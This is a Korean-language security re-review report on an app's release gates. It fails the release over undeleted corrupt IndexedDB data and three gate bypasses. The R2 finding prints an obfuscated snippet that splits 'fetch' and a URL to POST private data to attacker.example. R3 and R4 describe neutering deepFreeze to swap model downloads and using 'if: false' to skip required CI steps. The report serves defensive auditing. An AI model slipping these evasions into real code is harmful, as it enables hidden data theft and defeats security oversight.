# Task 9 보안 출시 게이트 독립 재검토 보고서

- 고정 검토 커밋: `68df5a5ea2f6a784c661e50197fe184f7a8c41c1`
- 검토 일자: 2026-07-30
- 검토자: 줄리아 (독립 보안 재검토)
- 최종 판정: **FAIL**
- 발견 사항: **Critical 0 / Important 4 / Minor 0**

전체 자동 검증과 현재 워크플로 자체는 정상 동작했습니다. 그러나 손상된 웹 저장 레코드는 사용자 확인 삭제로도 남으며, 네트워크·모델·워크플로 출시 게이트에는 실제 실행 가능한 변이가 통과하는 우회가 남아 있습니다. 따라서 I-01과 I-05는 종료할 수 있지만 I-02, I-03, I-04, I-06은 종료할 수 없습니다.

## Important

### R1 (I-02). 손상되거나 구형인 웹 개인 데이터는 명시적 삭제 후에도 IndexedDB에 남습니다

**위치**

- `src/features/workspace/workspaceRepository.ts:124-140`
- `src/features/workspace/workspaceRepository.test.ts:91-97`
- `src/app/state/useLifeAppState.ts:209-226`

`clearWorkspace()`는 현재 레코드가 `invalid`이면 즉시 `{ kind: "invalid" }`를 반환합니다. 이 경로에서는 개인 raw 데이터를 데이터 없는 톰스톤으로 교체하지 않고, `life-steward.workspace.v1`과 `careguardian.manual` 정리·검증도 실행하지 않습니다. 화면에서 사용자가 삭제를 확인해도 상위 상태는 실패 문구만 표시합니다. 기존 테스트 `"refuses deletion of an invalid original until explicit initialization"`도 이 잔존 동작을 명시적으로 고정하고 있습니다.

**재현**

```powershell
npx vitest run src/features/workspace/workspaceRepository.test.ts -t "refuses deletion of an invalid original"
```

해당 테스트는 통과했고, 잘못된 raw 레코드가 삭제되지 않은 채 다시 로드되는 현재 동작을 확인했습니다.

**영향**

스키마 손상, 부분 기록 또는 과거 버전 데이터처럼 사용자가 가장 직접적으로 제거해야 할 개인 데이터가 명시적 삭제 요청 후에도 IndexedDB에 남습니다. 현재·레거시 저장소 전체 삭제 요구를 충족하지 못합니다.

**권고**

명시적으로 확인된 전체 삭제는 데이터 유효성과 무관하게 하나의 IndexedDB 쓰기 트랜잭션에서 사용자 레코드를 `{ type: "cleared" }`로 교체하고, 현재·레거시 localStorage 키를 제거한 뒤 모두 검증해야 합니다. 동시 탭 충돌을 막으려면 삭제 대상 raw 또는 레코드 상태를 트랜잭션 안에서 다시 대조하되, 유효성 실패를 보존 사유로 사용하지 마십시오. 손상 레코드, 구형 raw, localStorage 재생성 및 멀티 탭 변이를 삭제 테스트에 추가해야 합니다.

### R2 (I-03). 분할된 네트워크 함수명과 URL은 모바일 원격 전송 게이트를 통과합니다

**위치**

- `scripts/check-non-medical-release.mjs:19`
- `scripts/check-non-medical-release.mjs:108-121`
- `scripts/check-non-medical-release.mjs:168-190`
- `scripts/check-non-medical-release.node-test.mjs:40-48`

네트워크 API 검사는 `fetch(` 같은 연속 문자열을 정규식으로 찾고, 계산 URL AST 검사는 해당 노드 원문에 `http`, `://` 또는 `huggingface`가 연속해서 보일 때만 실패시킵니다. 다음과 같이 함수명과 URL을 나누어 배열 결합과 계산 멤버 호출을 사용하면 React Native에서 실제 원격 POST가 가능하지만 `validateReleasePolicy()`는 `status: "pass"`를 반환했습니다.

```ts
const netName = "fet" + "ch";
const remote = ["h", "ttps", ":", "/", "/", "attacker.example/collect"].join("");
if ((globalThis as any).navigator?.product === "ReactNative") {
  void (globalThis as any)[netName](remote, {
    method: "POST",
    body: JSON.stringify({ workspace: "private" })
  });
}
```

**영향**

테스트 환경에서는 실행되지 않고 실제 모바일 런타임에서만 실행되는 개인 데이터 원격 전송을 추가해도 비의료·로컬 전용 출시 게이트가 통과할 수 있습니다. 웹 CSP는 모바일 React Native 런타임의 방어선이 아닙니다.

**권고**

TypeScript AST에서 직접 호출뿐 아니라 계산 프로퍼티 접근, 별칭, 배열 `join`, 상수 전파 및 전역 네트워크 객체 획득을 추적하십시오. 더 안전한 기준은 허용된 다운로드 어댑터 두 곳 이외의 네트워크 능력과 호출 그래프를 구조적으로 거부하는 것입니다. 분할 함수명, 배열 결합 URL, `globalThis[...]`, 프로덕션 전용 조건을 함께 사용하는 변이 테스트를 추가해야 합니다.

### R3 (I-04). `deepFreeze` 무력화와 사후 레지스트리 변조가 모델 허용 목록 검사를 통과합니다

**위치**

- `scripts/check-model-registry.mjs:159-277`
- `apps/mobile/src/local-ai/modelRegistry.ts:202-219`
- `apps/mobile/src/local-ai/modelStore.ts:172-184`

모델 검사기는 `MODEL_REGISTRY = deepFreeze(validatedRegistryData)`라는 호출 모양, 설치형 필터 및 getter 반환 모양은 확인하지만 `deepFreeze()` 구현 자체와 레지스트리 객체에 대한 사후 쓰기는 확인하지 않습니다. 검토 중 소스 문자열에서 `deepFreeze()`를 입력 그대로 반환하도록 바꾸고, React Native 조건 안에서 분할 URL·크기·SHA를 `MODEL_REGISTRY[0]`에 덮어쓰는 변이를 적용했습니다. JSON 원본은 그대로였으며 `validateRegistryFiles()`와 `validateReleasePolicy()`가 모두 `pass`를 반환했습니다.

`modelStore`의 `approvedModel()`은 후보와 `getInstallableModels()`의 동일하게 변조된 객체를 서로 대조하므로, 이 사후 변조를 독립적인 승인 기준으로 잡아내지 못합니다. 테스트 환경에서는 조건을 거짓으로 두어 기존 고정값 테스트도 유지할 수 있습니다.

**영향**

고정된 Naver GGUF URL·크기·SHA 대신 미승인 공급망 아티팩트를 실제 모바일에서 다운로드하도록 바꾸면서도 모델 및 정책 출시 게이트를 통과할 수 있습니다.

**권고**

`deepFreeze`의 재귀 구현을 AST로 고정 검증하고, 레지스트리 및 하위 객체에 대한 대입·갱신·메서드 변이를 모두 거부하십시오. 다운로드 승인 비교는 변조 가능한 런타임 export가 아니라 빌드 시 생성된 불변 승인 상수에서 수행해야 합니다. `deepFreeze` no-op, 조건부 사후 대입, 분할 URL, 크기·SHA 교체를 결합한 변이 테스트를 추가해야 합니다.

### R4 (I-06). 필수 CI 단계에 `if: false`를 붙여도 워크플로 게이트가 통과하고 Pages 배포가 계속됩니다

**위치**

- `.github/workflows/ci.yml:59-73`
- `scripts/check-release-workflow.mjs:19-70`
- `scripts/check-release-workflow.node-test.mjs:18-23`

현재 `ci.yml` 자체는 `verify -> deploy` 단일 SHA 연결을 올바르게 사용합니다. 그러나 검사기는 YAML 의미를 파싱하지 않고 필수 `run:` 문자열이 업로드 앞에 한 번 존재하는지만 확인합니다. 프로덕션 감사 단계에 아래 한 줄을 추가한 변이에서도 `validateReleaseWorkflow()`는 `status: "pass"`를 반환했습니다.

```yaml
- name: Production dependency audit
  if: false
  run: npm run release:audit-policy
```

GitHub Actions는 이 단계를 성공적으로 건너뛰며, 뒤의 artifact 업로드와 `needs: verify` 배포는 계속 진행할 수 있습니다. 같은 방식으로 정책·모델·변이 테스트 등 다른 필수 단계도 무력화할 수 있습니다.

**영향**

동일 SHA 및 `needs: verify` 관계가 유지돼도 필수 보안 게이트가 실제로 실행되지 않은 정적 산출물이 Pages에 배포될 수 있습니다.

**권고**

워크플로를 YAML로 파싱하여 필수 단계가 정확한 `verify` job에 있고 조건부 실행, `continue-on-error`, 셸 우회 또는 비실행 표현이 없음을 검증하십시오. artifact 업로드는 이 단계들 뒤에 있어야 하고 deploy는 해당 artifact만 소비해야 합니다. 각 필수 단계의 `if: false`, 표현식 기반 continue-on-error 및 다른 job 이동 변이 테스트를 추가해야 합니다.

## 종료 가능한 기존 항목

### I-01 모바일 삭제 실패 표시는 종료 가능

`clearMobileData()`는 실패 영역을 형식화된 `MobileFullDeletionError`로 집계하고 모든 독립 삭제 영역을 시도합니다. 컨트롤러는 실패 영역을 표시하고 잠금 상태를 유지하며 성공 문구를 설정하지 않습니다. Alert 콜백도 `observeDeleteAll()`을 통해 Promise 거부를 관찰합니다.

### I-05 프로덕션 감사 정확성은 종료 가능

감사 게이트는 심각도 수, 취약 패키지 및 GHSA 집합을 정렬 후 양방향으로 정확히 비교합니다. 누락·교체·추가 advisory, 잘못된 날짜, 만료, 비정상 종료 코드, signal, 네트워크 오류 및 잘못된 JSON이 모두 실패했습니다. 현재 기준은 Critical 0, High 19, Moderate 10, 총 29개 패키지와 GHSA 6건이며 만료일은 2026-08-13입니다. 실제 AAB 도달 가능성은 Task 10 전까지 입증되지 않았다는 문구도 유지됩니다.

## 검증 결과

- `npm run verify`: **PASS**
  - Vitest 21개 파일 / 181개 테스트
  - 웹 production build
  - 생성 HTML `index.html`, `privacy-policy.html` CSP 검사
  - 모바일 TypeScript
  - Expo Doctor 18/18
  - 정책·모델·정적·감사·워크플로 게이트와 24개 게이트 변이 테스트
- YAML 파싱: **PASS**
  - job은 `verify`, `deploy` 두 개이며 `deploy.needs`는 `verify`
  - 배포 job은 재체크아웃·재빌드 없이 검증 artifact만 사용
- GitHub Action 태그 대조: 네 개 고정 SHA 모두 선언된 공식 태그와 일치
- `npm run release:audit-policy`: **accepted-baseline**
- `git diff --check`: **PASS**
- 고정 검토 SHA와 작업 트리 기준 일치 확인

자동 검증 통과는 위 네 결함의 부재를 증명하지 않습니다. R1은 현재 제품 동작의 잔존 데이터 결함이고, R2~R4는 현행 변이 게이트가 놓치는 재현 가능한 실행 의미 우회입니다.
